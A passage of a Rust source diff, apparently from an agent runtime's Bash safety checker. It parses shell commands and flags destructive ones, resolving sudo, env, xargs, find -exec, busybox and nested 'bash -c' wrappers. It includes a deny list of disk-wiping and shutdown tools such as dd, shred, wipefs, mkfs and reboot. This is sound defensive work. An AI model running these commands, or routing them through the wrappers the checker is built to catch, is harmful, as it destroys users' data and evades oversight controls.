@@ -212,6 +212,139 @@ fn parse_plain_command(node: Node<'_>, source: &str) -> Option<Vec<String>> {
     (!words.is_empty()).then_some(words)
 }
 
+#[derive(Debug, Clone)]
+enum CommandWord {
+    Literal(String),
+    Dynamic {
+        may_split: bool,
+        proven_find_path: bool,
+    },
+}
+
+impl CommandWord {
+    fn literal(&self) -> Option<&str> {
+        match self {
+            Self::Literal(value) => Some(value),
+            Self::Dynamic { .. } => None,
+        }
+    }
+
+    fn may_split(&self) -> bool {
+        matches!(
+            self,
+            Self::Dynamic {
+                may_split: true,
+                ..
+            }
+        )
+    }
+
+    fn is_proven_find_path(&self) -> bool {
+        matches!(
+            self,
+            Self::Dynamic {
+                proven_find_path: true,
+                ..
+            }
+        )
+    }
+}
+
+fn command_words(node: Node<'_>, source: &str) -> Option<Vec<CommandWord>> {
+    if node.kind() != "command" || node.has_error() {
+        return None;
+    }
+    let mut words = Vec::new();
+    let mut cursor = node.walk();
+    for child in node.named_children(&mut cursor) {
+        let word_node = match child.kind() {
+            "command_name" => child.named_child(0)?,
+            "word" | "number" | "string" | "raw_string" | "concatenation" => child,
+            "variable_assignment"
+            | "file_redirect"
+            | "heredoc_redirect"
+            | "herestring_redirect" => continue,
+            _ => {
+                words.push(CommandWord::Dynamic {
+                    may_split: dynamic_word_may_split(child, source),
+                    proven_find_path: dynamic_word_has_proven_find_path_prefix(child, source),
+                });
+                continue;
+            }
+        };
+        words.push(
+            parse_plain_word(word_node, source)
+                .map(CommandWord::Literal)
+                .unwrap_or_else(|| CommandWord::Dynamic {
+                    may_split: dynamic_word_may_split(word_node, source),
+                    proven_find_path: dynamic_word_has_proven_find_path_prefix(word_node, source),
+                }),
+        );
+    }
+    (!words.is_empty()).then_some(words)
+}
+
+/// Whether a runtime-dependent shell word can expand into multiple argv
+/// entries. A double-quoted scalar variable remains exactly one argv entry;
+/// every other dynamic spelling is kept conservative because unquoted field
+/// splitting, arrays, `$@`, or substitutions can change command boundaries.
+fn dynamic_word_may_split(node: Node<'_>, source: &str) -> bool {
+    if node.kind() != "string" {
+        return true;
+    }
+
+    let mut cursor = node.walk();
+    node.named_children(&mut cursor)
+        .any(|child| match child.kind() {
+            "string_content" => false,
+            "simple_expansion" | "expansion" => {
+                let raw = child.utf8_text(source.as_bytes()).unwrap_or_default();
+                !is_quoted_scalar_expansion(raw)
+            }
+            _ => true,
+        })
+}
+
+/// A runtime-dependent `find` operand is provably a path only when a literal
+/// prefix forces path syntax regardless of the expansion value. Quoting alone
+/// is insufficient because a scalar value may itself be `-exec`.
+fn dynamic_word_has_proven_find_path_prefix(node: Node<'_>, source: &str) -> bool {
+    if node.kind() != "string" {
+        return false;
+    }
+
+    let mut cursor = node.walk();
+    let Some(prefix_node) = node.named_children(&mut cursor).next() else {
+        return false;
+    };
+    if prefix_node.kind() != "string_content" {
+        return false;
+    }
+    let Some(prefix) = prefix_node
+        .utf8_text(source.as_bytes())
+        .ok()
+        .and_then(decode_double_quoted_content)
+    else {
+        return false;
+    };
+    prefix.starts_with('/') || prefix.starts_with("./") || prefix.starts_with("../")
+}
+
+fn is_quoted_scalar_expansion(raw: &str) -> bool {
+    let name = raw
+        .strip_prefix("${")
+        .and_then(|value| value.strip_suffix('}'))
+        .or_else(|| raw.strip_prefix('$'));
+    let Some(name) = name else {
+        return false;
+    };
+    let mut chars = name.chars();
+    chars
+        .next()
+        .is_some_and(|first| first == '_' || first.is_ascii_alphabetic())
+        && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
+}
+
 fn parse_plain_word(node: Node<'_>, source: &str) -> Option<String> {
     match node.kind() {
         "word" | "number" => {
@@ -270,7 +403,7 @@ fn decode_unquoted_shell_word(raw: &str) -> Option<String> {
     while let Some(ch) = chars.next() {
         if ch == '\\' {
             value.push(chars.next()?);
-        } else if matches!(ch, '*' | '?' | '[' | ']') {
+        } else if matches!(ch, '*' | '?' | '[') {
             // Unquoted pathname/brace expansion means the source spelling is
             // not the argv Bash will execute. Escaped forms took the branch
             // above and are safe literal characters.
@@ -346,23 +479,1061 @@ fn decode_double_quoted_content(raw: &str) -> Option<String> {
 /// and avoids false positives from string literals.
 /// Returns detected risks. If the shell cannot be parsed, returns an empty vector (no substring fallback).
 pub fn analyze_bash_risks_ast(command: &str) -> Vec<CommandRisk> {
+    analyze_bash_risks_ast_inner(command, 0)
+}
+
+fn analyze_bash_risks_ast_inner(command: &str, shell_depth: usize) -> Vec<CommandRisk> {
     let Some(tree) = parse_bash(command) else {
         return Vec::new();
     };
     let root = tree.root_node();
-    let mut ctx = RiskCtx::new(command);
+    let mut ctx = RiskCtx::with_shell_depth(command, shell_depth);
+
     visit_node(root, &mut ctx);
     ctx.into_risks()
 }
 
+enum NestedShellScript<'a> {
+    None,
+    Script(&'a str),
+    Ambiguous,
+}
+
+const SHELL_LONG_OPTIONS: &[&str] = &[
+    "--debug",
+    "--debugger",
+    "--dump-po-strings",
+    "--dump-strings",
+    "--help",
+    "--login",
+    "--noediting",
+    "--noprofile",
+    "--norc",
+    "--posix",
+    "--pretty-print",
+    "--restricted",
+    "--verbose",
+    "--version",
+];
+const SHELL_LONG_OPTIONS_WITH_VALUE: &[&str] = &["--init-file", "--rcfile"];
+const SHELL_SHORT_OPTIONS: &str = "abefhiklmnprstuvxBCEHPTDqVE";
+
+fn nested_shell_script(words: &[CommandWord]) -> NestedShellScript<'_> {
+    let index = match resolve_transparent_launcher(words, 0) {
+        LauncherResolution::Dispatch(index) => index,
+        LauncherResolution::NoDispatch => return NestedShellScript::None,
+        LauncherResolution::Ambiguous => return NestedShellScript::Ambiguous,
+    };
+    let Some(executable) = words
+        .get(index)
+        .and_then(CommandWord::literal)
+        .map(command_basename)
+    else {
+        return NestedShellScript::Ambiguous;
+    };
+    if !matches!(executable.as_str(), "bash" | "sh" | "dash" | "zsh" | "ksh") {
+        return NestedShellScript::None;
+    }
+
+    let mut argument_index = index + 1;
+    while let Some(word) = words.get(argument_index) {
+        let Some(argument) = word.literal() else {
+            return NestedShellScript::Ambiguous;
+        };
+        if argument == "--" || argument == "-" {
+            return match words.get(argument_index + 1) {
+                Some(CommandWord::Dynamic { .. }) => NestedShellScript::Ambiguous,
+                _ => NestedShellScript::None,
+            };
+        }
+        if !argument.starts_with('-') && !argument.starts_with('+') {
+            return NestedShellScript::None;
+        }
+
+        if argument.starts_with("--") {
+            let (option, inline_value) = argument
+                .split_once('=')
+                .map_or((argument, false), |(option, _)| (option, true));
+            if SHELL_LONG_OPTIONS.contains(&option) && !inline_value {
+                argument_index += 1;
+                continue;
+            }
+            if SHELL_LONG_OPTIONS_WITH_VALUE.contains(&option) {
+                if !inline_value {
+                    argument_index = match consume_single_argv(words, argument_index + 1) {
+                        Ok(next) => next,
+                        Err(()) => return NestedShellScript::Ambiguous,
+                    };
+                } else {
+                    argument_index += 1;
+                }
+                continue;
+            }
+            return NestedShellScript::Ambiguous;
+        }
+
+        let Some(flags) = argument.get(1..) else {
+            return NestedShellScript::Ambiguous;
+        };
+        if flags.is_empty()
+            || flags
+                .chars()
+                .any(|flag| !SHELL_SHORT_OPTIONS.contains(flag) && !matches!(flag, 'c' | 'o' | 'O'))
+        {
+            return NestedShellScript::Ambiguous;
+        }
+        if argument.starts_with('+') && flags.contains('c') {
+            return NestedShellScript::Ambiguous;
+        }
+        let option_name_count = flags.matches(['o', 'O']).count();
+        if flags.contains('c') {
+            let mut script_index = argument_index + 1;
+            for _ in 0..option_name_count {
+                script_index = match consume_single_argv(words, script_index) {
+                    Ok(next) => next,
+                    Err(()) => return NestedShellScript::Ambiguous,
+                };
+            }
+            return words
+                .get(script_index)
+                .and_then(CommandWord::literal)
+                .map_or(NestedShellScript::Ambiguous, NestedShellScript::Script);
+        }
+        argument_index += 1;
+        for _ in 0..option_name_count {
+            argument_index = match consume_single_argv(words, argument_index) {
+                Ok(next) => next,
+                Err(()) => return NestedShellScript::Ambiguous,
+            };
+        }
+    }
+    NestedShellScript::None
+}
+
+const DESTRUCTIVE_COMMANDS: &[&str] = &[
+    "dd",
+    "mkswap",
+    "truncate",
+    "shred",
+    "wipefs",
+    "blkdiscard",
+    "fdisk",
+    "sfdisk",
+    "parted",
+    "cryptsetup",
+    "pvremove",
+    "vgremove",
+    "lvremove",
+    "zpool",
+    "zfs",
+    "shutdown",
+    "reboot",
+    "poweroff",
+    "halt",
+    "telinit",
+];
+
+enum DestructiveCommandResolution {
+    Safe,
+    Destructive(String),
+    ChildRisks(Vec<CommandRisk>),
+    Ambiguous,
+}
+
+fn resolve_destructive_command(
+    words: &[CommandWord],
+    shell_depth: usize,
+) -> DestructiveCommandResolution {
+    let index = match resolve_transparent_launcher(words, 0) {
+        LauncherResolution::Dispatch(index) => index,
+        LauncherResolution::NoDispatch => return DestructiveCommandResolution::Safe,
+        LauncherResolution::Ambiguous => return DestructiveCommandResolution::Ambiguous,
+    };
+    let Some(executable) = words.get(index).and_then(CommandWord::literal) else {
+        return DestructiveCommandResolution::Ambiguous;
+    };
+    let executable = command_basename(executable);
+    if executable == "mkfs" || executable.starts_with("mkfs.") {
+        return DestructiveCommandResolution::Destructive("mkfs".to_string());
+    }
+    if let Some(name) = DESTRUCTIVE_COMMANDS
+        .iter()
+        .copied()
+        .find(|candidate| executable.eq_ignore_ascii_case(candidate))
+    {
+        return DestructiveCommandResolution::Destructive(name.to_string());
+    }
+    match nested_shell_script(words) {
+        NestedShellScript::Script(_) if shell_depth >= 16 => {
+            return DestructiveCommandResolution::Ambiguous;
+        }
+        NestedShellScript::Script(script) => {
+            let nested_risks = analyze_bash_risks_ast_inner(script, shell_depth + 1);
+            if !nested_risks.is_empty() {
+                return DestructiveCommandResolution::ChildRisks(nested_risks);
+            }
+        }
+        NestedShellScript::Ambiguous => return DestructiveCommandResolution::Ambiguous,
+        NestedShellScript::None => {}
+    }
+
+    match executable.as_str() {
+        "busybox" | "toybox" => resolve_multicall_applet(&words[index + 1..], shell_depth),
+        "xargs" => resolve_xargs_command(&words[index + 1..], shell_depth),
+        "find" => resolve_find_commands(&words[index + 1..], shell_depth),
+        _ => DestructiveCommandResolution::Safe,
+    }
+}
+
+enum LauncherResolution {
+    Dispatch(usize),
+    NoDispatch,
+    Ambiguous,
+}
+
+/// Resolve the executable owned by a known command-dispatch surface.
+///
+/// This registry is defense in depth. OS isolation and workspace capability
+/// enforcement remain the security boundary; an arbitrary executable may
+/// itself launch another process and cannot be proven otherwise from Bash AST
+/// alone. Entries here cover standard dispatch surfaces in Astra's supported
+/// runtime environments and fail closed when an argv boundary is ambiguous.
+fn resolve_transparent_launcher(words: &[CommandWord], index: usize) -> LauncherResolution {
+    match resolve_transparent_launcher_index(words, index) {
+        Ok(Some(index)) => LauncherResolution::Dispatch(index),
+        Ok(None) => LauncherResolution::NoDispatch,
+        Err(()) => LauncherResolution::Ambiguous,
+    }
+}
+
+fn resolve_transparent_launcher_index(
+    words: &[CommandWord],
+    mut index: usize,
+) -> Result<Option<usize>, ()> {
+    loop {
+        let Some(word) = words.get(index) else {
+            return Ok(None);
+        };
+        let executable = command_basename(word.literal().ok_or(())?);
+        index += 1;
+        match executable.as_str() {
+            "command" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new("p", "", &[], &[], &[])
+                        .with_terminal_flags("Vv", &[]),
+                )?
+                else {
+                    return Ok(None);
+                };
+                index = next;
+            }
+            "builtin" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new("", "", &[], &[], &[])
+                        .with_terminal_flags("", &["--help"]),
+                )?
+                else {
+                    return Ok(None);
+                };
+                index = next;
+            }
+            "exec" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new("cl", "a", &[], &[], &[])
+                        .with_terminal_flags("", &["--help"]),
+                )?
+                else {
+                    return Ok(None);
+                };
+                index = next;
+            }
+            "nohup" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new("", "", &[], &[], &[])
+                        .with_terminal_flags("", &["--help", "--version"]),
+                )?
+                else {
+                    return Ok(None);
+                };
+                index = next;
+            }
+            "env" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new(
+                        "i0v",
+                        "uCPa",
+                        &[
+                            "--ignore-environment",
+                            "--null",
+                            "--debug",
+                            "--list-signal-handling",
+                        ],
+                        &["--unset", "--chdir", "--path", "--argv0"],
+                        &["--block-signal", "--default-signal", "--ignore-signal"],
+                    )
+                    .with_terminal_flags("", &["--help", "--version"]),
+                )?
+                else {
+                    return Ok(None);
+                };
+                index = next;
+                while words
+                    .get(index)
+                    .and_then(CommandWord::literal)
+                    .is_some_and(is_assignment)
+                {
+                    index += 1;
+                }
+            }
+            "sudo" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new(
+                        "ABbEHikNnPSs",
+                        "CDghpRTUurt",
+                        &[
+                            "--askpass",
+                            "--background",
+                            "--bell",
+                            "--set-home",
+                            "--login",
+                            "--reset-timestamp",
+                            "--non-interactive",
+                            "--preserve-groups",
+                            "--stdin",
+                            "--shell",
+                        ],
+                        &[
+                            "--close-from",
+                            "--chdir",
+                            "--group",
+                            "--host",
+                            "--prompt",
+                            "--chroot",
+                            "--command-timeout",
+                            "--other-user",
+                            "--role",
+                            "--type",
+                            "--user",
+                        ],
+                        &["--preserve-env"],
+                    )
+                    .with_terminal_flags(
+                        "eKlVv",
+                        &[
+                            "--edit",
+                            "--help",
+                            "--list",
+                            "--remove-timestamp",
+                            "--version",
+                            "--validate",
+                        ],
+                    ),
+                )?
+                else {
+                    return Ok(None);
+                };
+                index = next;
+            }
+            "doas" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new("ns", "au", &[], &[], &[])
+                        .with_terminal_flags("L", &[])
+                        .with_terminal_value_options("C", &[]),
+                )?
+                else {
+                    return Ok(None);
+                };
+                index = next;
+            }
+            "pkexec" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new(
+                        "",
+                        "",
+                        &["--disable-internal-agent", "--keep-cwd"],
+                        &["--user"],
+                        &[],
+                    )
+                    .with_terminal_flags("", &["--version"]),
+                )?
+                else {
+                    return Ok(None);
+                };
+                index = next;
+            }
+            "timeout" | "gtimeout" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new(
+                        "fpv",
+                        "ks",
+                        &["--foreground", "--preserve-status", "--verbose"],
+                        &["--kill-after", "--signal"],
+                        &[],
+                    )
+                    .with_terminal_flags("", &["--help", "--version"]),
+                )?
+                else {
+                    return Ok(None);
+                };
+                let Some(next) = skip_launcher_operands(words, next, 1)? else {
+                    return Ok(None);
+                };
+                index = next;
+            }
+            "nice" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new("", "n", &[], &["--adjustment"], &[])
+                        .with_terminal_flags("", &["--help", "--version"])
+                        .with_legacy_numeric_short_option(),
+                )?
+                else {
+                    return Ok(None);
+                };
+                index = next;
+            }
+            "ionice" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new(
+                        "t",
+                        "cn",
+                        &["--ignore"],
+                        &["--class", "--classdata"],
+                        &[],
+                    )
+                    .with_terminal_flags("hV", &["--help", "--version"])
+                    .with_terminal_value_options("pPu", &["--pid", "--pgid", "--uid"]),
+                )?
+                else {
+                    return Ok(None);
+                };
+                index = next;
+            }
+            "setsid" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new(
+                        "cfw",
+                        "",
+                        &["--ctty", "--fork", "--wait"],
+                        &[],
+                        &[],
+                    )
+                    .with_terminal_flags("hV", &["--help", "--version"]),
+                )?
+                else {
+                    return Ok(None);
+                };
+                index = next;
+            }
+            "stdbuf" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new(
+                        "",
+                        "ioe",
+                        &[],
+                        &["--input", "--output", "--error"],
+                        &[],
+                    )
+                    .with_terminal_flags("", &["--help", "--version"]),
+                )?
+                else {
+                    return Ok(None);
+                };
+                index = next;
+            }
+            "taskset" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new("ac", "", &["--all-tasks", "--cpu-list"], &[], &[])
+                        .with_terminal_flags("phV", &["--pid", "--help", "--version"]),
+                )?
+                else {
+                    return Ok(None);
+                };
+                let Some(next) = skip_launcher_operands(words, next, 1)? else {
+                    return Ok(None);
+                };
+                index = next;
+            }
+            "chroot" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new(
+                        "",
+                        "",
+                        &["--skip-chdir"],
+                        &["--groups", "--userspec"],
+                        &[],
+                    )
+                    .with_terminal_flags("", &["--help", "--version"]),
+                )?
+                else {
+                    return Ok(None);
+                };
+                let Some(next) = skip_launcher_operands(words, next, 1)? else {
+                    return Ok(None);
+                };
+                index = next;
+            }
+            "unshare" => {
+                let Some(next) = skip_launcher_options(
+                    words,
+                    index,
+                    LauncherOptionGrammar::new(
+                        "fmuinpCTUrc",
+                        "RwSGl",
+                        &[
+                            "--fork",
+                            "--forward-signals",
+                            "--map-root-user",
+                            "--map-current-user",
+                            "--map-auto",
+                            "--map-subids",
+                            "--keep-caps",
+                            "--clear-env",
+                        ],
+                        &[
+                            "--load-interp",
+                            "--map-user",
+                            "--map-users",
+                            "--map-group",
+                            "--map-groups",
+                            "--owner",
+                            "--propagation",
+                            "--setgroups",
+                            "--setuid",
+                            "--setgid",
+                            "--root",
+                            "--wd",
+                            "--monotonic",
+                            "--boottime",
+                            "--whitelist-env",
+                        ],
+                        &[
+                            "--mount",
+                            "--uts",
+                            "--ipc",
+                            "--net",
+                            "--pid",
+                            "--user",
+                            "--cgroup",
+                            "--time",
+                            "--kill-child",
+                            "--mount-proc",
+                            "--mount-binfmt",
+                        ],
+                    )
+                    .with_terminal_flags("hV", &["--help", "--version"]),
+                )?
+                else {
+                    return Ok(None);
+                };
+                index = next;
+            }
+            _ => return Ok(Some(index - 1)),
+        }
+    }
+}
+
+#[derive(Clone, Copy)]
+struct LauncherOptionGrammar {
+    short_flags: &'static str,
+    short_options_with_value: &'static str,
+    long_flags: &'static [&'static str],
+    long_options_with_value: &'static [&'static str],
+    long_options_with_optional_value: &'static [&'static str],
+    terminal_short_flags: &'static str,
+    terminal_short_options_with_value: &'static str,
+    terminal_long_flags: &'static [&'static str],
+    terminal_long_options_with_value: &'static [&'static str],
+    legacy_numeric_short_option: bool,
+}
+
+impl LauncherOptionGrammar {
+    const fn new(
+        short_flags: &'static str,
+        short_options_with_value: &'static str,
+        long_flags: &'static [&'static str],
+        long_options_with_value: &'static [&'static str],
+        long_options_with_optional_value: &'static [&'static str],
+    ) -> Self {
+        Self {
+            short_flags,
+            short_options_with_value,
+            long_flags,
+            long_options_with_value,
+            long_options_with_optional_value,
+            terminal_short_flags: "",
+            terminal_short_options_with_value: "",
+            terminal_long_flags: &[],
+            terminal_long_options_with_value: &[],
+            legacy_numeric_short_option: false,
+        }
+    }
+
+    const fn with_terminal_flags(
+        mut self,
+        short: &'static str,
+        long: &'static [&'static str],
+    ) -> Self {
+        self.terminal_short_flags = short;
+        self.terminal_long_flags = long;
+        self
+    }
+
+    const fn with_terminal_value_options(
+        mut self,
+        short: &'static str,
+        long: &'static [&'static str],
+    ) -> Self {
+        self.terminal_short_options_with_value = short;
+        self.terminal_long_options_with_value = long;
+        self
+    }
+
+    const fn with_legacy_numeric_short_option(mut self) -> Self {
+        self.legacy_numeric_short_option = true;
+        self
+    }
+}
+
+fn skip_launcher_options(
+    words: &[CommandWord],
+    mut index: usize,
+    grammar: LauncherOptionGrammar,
+) -> Result<Option<usize>, ()> {
+    while let Some(word) = words.get(index) {
+        let argument = word.literal().ok_or(())?;
+        if argument == "--" {
+            return Ok((index + 1 < words.len()).then_some(index + 1));
+        }
+        if !argument.starts_with('-') || argument == "-" {
+            return Ok(Some(index));
+        }
+
+        if argument.starts_with("--") {
+            let (option, inline_value) = argument
+                .split_once('=')
+                .map_or((argument, false), |(name, _)| (name, true));
+            if grammar.terminal_long_flags.contains(&option) && !inline_value {
+                return Ok(None);
+            }
+            if grammar.terminal_long_options_with_value.contains(&option) {
+                if !inline_value {
+                    consume_single_argv(words, index + 1)?;
+                }
+                return Ok(None);
+            }
+            if grammar.long_flags.contains(&option) && !inline_value
+                || grammar.long_options_with_optional_value.contains(&option)
+            {
+                index += 1;
+                continue;
+            }
+            if !grammar.long_options_with_value.contains(&option) {
+                return Err(());
+            }
+            index += 1;
+            if !inline_value {
+                if words.get(index).is_none() {
+                    return Ok(None);
+                }
+                index = consume_single_argv(words, index)?;
+            }
+            continue;
+        }
+
+        if grammar.legacy_numeric_short_option
+            && argument.strip_prefix('-').is_some_and(|value| {
+                !value.is_empty() && value.chars().all(|ch| ch.is_ascii_digit())
+            })
+        {
+            index += 1;
+            continue;
+        }
+
+        let mut flags = argument[1..].chars().peekable();
+        if flags.peek().is_none() {
+            return Ok(Some(index));
+        }
+        let mut next_index = index.checked_add(1).ok_or(())?;
+        while let Some(flag) = flags.next() {
+            if grammar.terminal_short_flags.contains(flag) {
+                return Ok(None);
+            }
+            if grammar.terminal_short_options_with_value.contains(flag) {
+                if flags.peek().is_none() {
+                    consume_single_argv(words, index + 1)?;
+                }
+                return Ok(None);
+            }
+            if grammar.short_flags.contains(flag) {
+                continue;
+            }
+            if !grammar.short_options_with_value.contains(flag) {
+                return Err(());
+            }
+            if flags.peek().is_none() {
+                if words.get(next_index).is_none() {
+                    return Ok(None);
+                }
+                next_index = consume_single_argv(words, next_index)?;
+            }
+            break;
+        }
+        index = next_index;
+    }
+    Ok(None)
+}
+
+/// Consume one source word only when it is guaranteed to remain one runtime
+/// argv entry. Unquoted expansions may field-split and therefore cannot be
+/// used to advance a statically resolved executable boundary.
+fn consume_single_argv(words: &[CommandWord], index: usize) -> Result<usize, ()> {
+    let word = words.get(index).ok_or(())?;
+    if word.may_split() {
+        return Err(());
+    }
+    index.checked_add(1).ok_or(())
+}
+
+fn skip_launcher_operands(
+    words: &[CommandWord],
+    index: usize,
+    count: usize,
+) -> Result<Option<usize>, ()> {
+    let mut command_index = index;
+    for _ in 0..count {
+        if words.get(command_index).is_none() {
+            return Ok(None);
+        }
+        command_index = consume_single_argv(words, command_index)?;
+    }
+    Ok((command_index < words.len()).then_some(command_index))
+}
+
+fn resolve_multicall_applet(
+    words: &[CommandWord],
+    shell_depth: usize,
+) -> DestructiveCommandResolution {
+    let Some(applet) = words.first().and_then(CommandWord::literal) else {
+        return if words.is_empty() {
+            DestructiveCommandResolution::Safe
+        } else {
+            DestructiveCommandResolution::Ambiguous
+        };
+    };
+    if applet.starts_with('-') {
+        return if matches!(
+            applet,
+            "--help" | "--list" | "--list-full" | "--install" | "--show"
+        ) {
+            DestructiveCommandResolution::Safe
+        } else {
+            DestructiveCommandResolution::Ambiguous
+        };
+    }
+    resolve_destructive_command(words, shell_depth)
+}
+
+fn resolve_xargs_command(
+    words: &[CommandWord],
+    shell_depth: usize,
+) -> DestructiveCommandResolution {
+    const OPTIONS_WITH_VALUE: &[&str] = &[
+        "-E",
+        "-L",
+        "-n",
+        "--max-args",
+        "-P",
+        "--max-procs",
+        "-s",
+        "--max-chars",
+        "--process-slot-var",
+        "-a",
+        "--arg-file",
+        "-d",
+        "--delimiter",
+    ];
+    const LONG_OPTIONS_WITH_OPTIONAL_INLINE_VALUE: &[&str] = &["--eof", "--max-lines"];
+    const OPTIONS_WITH_ATTACHED_VALUE: &[&str] = &["-E", "-L", "-n", "-P", "-s", "-a", "-d"];
+    const FLAGS: &[&str] = &[
+        "-0",
+        "--null",
+        "-p",
+        "--interactive",
+        "-r",
+        "--no-run-if-empty",
+        "-t",
+        "--verbose",
+        "-x",
+        "--exit",
+        "--show-limits",
+    ];
+    const TERMINAL_FLAGS: &[&str] = &["--help", "--version"];
+
+    let mut replacement = None;
+    let mut index = 0;
+    while let Some(word) = words.get(index) {
+        let Some(argument) = word.literal() else {
+            return DestructiveCommandResolution::Ambiguous;
+        };
+        if argument == "--" {
+            index += 1;
+            break;
+        }
+        if !argument.starts_with('-') || argument == "-" {
+            break;
+        }
+        let option = argument.split_once('=').map_or(argument, |(name, _)| name);
+        if TERMINAL_FLAGS.contains(&argument) {
+            return DestructiveCommandResolution::Safe;
+        }
+        if argument == "-I" {
+            let Some(value) = words.get(index + 1).and_then(CommandWord::literal) else {
+                return DestructiveCommandResolution::Ambiguous;
+            };
+            replacement = Some(value);
+            index += 2;
+            continue;
+        }
+        if let Some(value) = argument
+            .strip_prefix("-I")
+            .filter(|value| !value.is_empty())
+        {
+            replacement = Some(value);
+            index += 1;
+            continue;
+        }
+        if option == "--replace" {
+            replacement = Some(argument.split_once('=').map_or("{}", |(_, value)| value));
+            index += 1;
+            continue;
+        }
+        if LONG_OPTIONS_WITH_OPTIONAL_INLINE_VALUE.contains(&option) {
+            index += 1;
+            continue;
+        }
+        if OPTIONS_WITH_VALUE.contains(&option) {
+            index += 1;
+            if !argument.contains('=') {
+                let Ok(next) = consume_single_argv(words, index) else {
+                    return DestructiveCommandResolution::Ambiguous;
+                };
+                index = next;
+            }
+            continue;
+        }
+        if OPTIONS_WITH_ATTACHED_VALUE
+            .iter()
+            .any(|prefix| argument.starts_with(prefix) && argument.len() > prefix.len())
+            || FLAGS.contains(&argument)
+            || argument
+                .strip_prefix('-')
+                .is_some_and(|flags| flags.chars().all(|flag| "0prtx".contains(flag)))
+        {
+            index += 1;
+            continue;
+        }
+        return DestructiveCommandResolution::Ambiguous;
+    }
+
+    if index == words.len() {
+        DestructiveCommandResolution::Safe
+    } else {
+        match replacement {
+            Some(marker) => resolve_replaced_command(&words[index..], marker, false, shell_depth),
+            None => {
+                // Input supplies an unknown argv suffix, not just data: it can
+                // complete an unfinished launcher or shell option boundary.
+                let mut child = words[index..].to_vec();
+                child.push(CommandWord::Dynamic {
+                    may_split: true,
+                    proven_find_path: false,
+                });
+                resolve_destructive_command(&child, shell_depth)
+            }
+        }
+    }
+}
+
+/// Replacement preserves argv boundaries but not literal contents. Reuse the
+/// normal resolver so data arguments stay allowed while executable/script and
+/// option boundaries must still be statically known.
+fn resolve_replaced_command(
+    words: &[CommandWord],
+    marker: &str,
+    replace_executable: bool,
+    shell_depth: usize,
+) -> DestructiveCommandResolution {
+    if marker.is_empty() {
+        return DestructiveCommandResolution::Ambiguous;
+    }
+    let replaced: Vec<_> = words
+        .iter()
+        .enumerate()
+        .map(|(index, word)| match word.literal() {
+            Some(value) if (replace_executable || index > 0) && value.contains(marker) => {
+                CommandWord::Dynamic {
+                    may_split: false,
+                    proven_find_path: false,
+                }
+            }
+            _ => word.clone(),
+        })
+        .collect();
+    resolve_destructive_command(&replaced, shell_depth)
+}
+
+fn resolve_find_commands(
+    words: &[CommandWord],
+    shell_depth: usize,
+) -> DestructiveCommandResolution {
+    let mut index = 0;
+    let mut expression_started = false;
+    let mut child_risks = Vec::new();
+    while index < words.len() {
+        let Some(argument) = words[index].literal() else {
+            // Quoting proves one argv entry, but not that its value is a path:
+            // a quoted scalar may still expand to `-exec`. Only a literal path
+            // prefix is sufficient before the expression begins.
+            if words[index].may_split() || expression_started || !words[index].is_proven_find_path()
+            {
+                return DestructiveCommandResolution::Ambiguous;
+            }
+            index += 1;
+            continue;
+        };
+        expression_started |= is_find_expression_start(argument);
+        let operand_count = find_predicate_operand_count(argument);
+        if operand_count > 0 {
+            index += 1;
+            for _ in 0..operand_count {
+                let Ok(next) = consume_single_argv(words, index) else {
+                    return DestructiveCommandResolution::Ambiguous;
+                };
+                index = next;
+            }
+            continue;
+        }
+        if !matches!(argument, "-exec" | "-execdir" | "-ok" | "-okdir") {
+            index += 1;
+            continue;
+        }
+        let command_start = index + 1;
+        let Some(command_end) = (command_start..words.len()).find(|candidate| {
+            words[*candidate]
+                .literal()
+                .is_some_and(|word| matches!(word, ";" | "+"))
+        }) else {
+            return DestructiveCommandResolution::Ambiguous;
+        };
+        if words[command_start..command_end]
+            .iter()
+            .any(CommandWord::may_split)
+        {
+            return DestructiveCommandResolution::Ambiguous;
+        }
+        match resolve_replaced_command(&words[command_start..command_end], "{}", true, shell_depth)
+        {
+            DestructiveCommandResolution::Safe => {}
+            DestructiveCommandResolution::ChildRisks(risks) => child_risks.extend(risks),
+            result => return result,
+        }
+        index = command_end + 1;
+    }
+    if child_risks.is_empty() {
+        DestructiveCommandResolution::Safe
+    } else {
+        DestructiveCommandResolution::ChildRisks(child_risks)
+    }
+}
+
+fn is_find_expression_start(argument: &str) -> bool {
+    argument.starts_with('-') || matches!(argument, "!" | "(" | ")" | ",")
+}
+
+fn find_predicate_operand_count(argument: &str) -> usize {
+    if let Some(suffix) = argument.strip_prefix("-newer") {
+        let bytes = suffix.as_bytes();
+        if bytes.len() == 2 && b"acmB".contains(&bytes[0]) && b"acmBt".contains(&bytes[1]) {
+            return 1;
+        }
+    }
+    match argument {
+        "-fprintf" => 2,
+        "-name" | "-iname" | "-path" | "-ipath" | "-wholename" | "-iwholename" | "-regex"
+        | "-iregex" | "-lname" | "-ilname" | "-type" | "-xtype" | "-size" | "-user" | "-group"
+        | "-uid" | "-gid" | "-perm" | "-inum" | "-links" | "-samefile" | "-newer" | "-anewer"
+        | "-cnewer" | "-amin" | "-atime" | "-cmin" | "-ctime" | "-mmin" | "-mtime" | "-used"
